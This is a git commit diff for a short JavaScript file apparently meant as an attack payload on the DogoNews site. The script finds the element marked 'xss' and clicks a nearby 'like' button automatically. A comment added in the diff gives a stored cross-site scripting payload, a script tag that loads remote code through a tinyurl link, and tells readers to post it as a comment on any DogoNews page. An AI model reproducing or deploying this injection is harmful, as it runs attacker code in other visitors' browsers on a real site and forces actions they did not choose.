ed40793b189b101df5001f4311178a17c245d29f
ComputerCandy <thomas.kool.12@gmail.com>
2017-02-10 20:15:53 +1300

    Footer

--- js.js
+++ js.js
@@ -1,1 +1,11 @@
-$(".xss").parent().parent().find('.footer').first().find('button.like.btn').first().click();
+$(".xss").parent().parent().find('.footer').first().find('button.like.btn').first().click(); //Auto Like!
+
+
+/*
+Breaks Any DogoNews page:
+<script src="https://tinyurl.com/j39dsb4" class="xss">run()</script>
+Just comment it with a message after and watch the magic!
+
+--Share--
+@HacksNeedFatKids#9617 on Discord
+*/
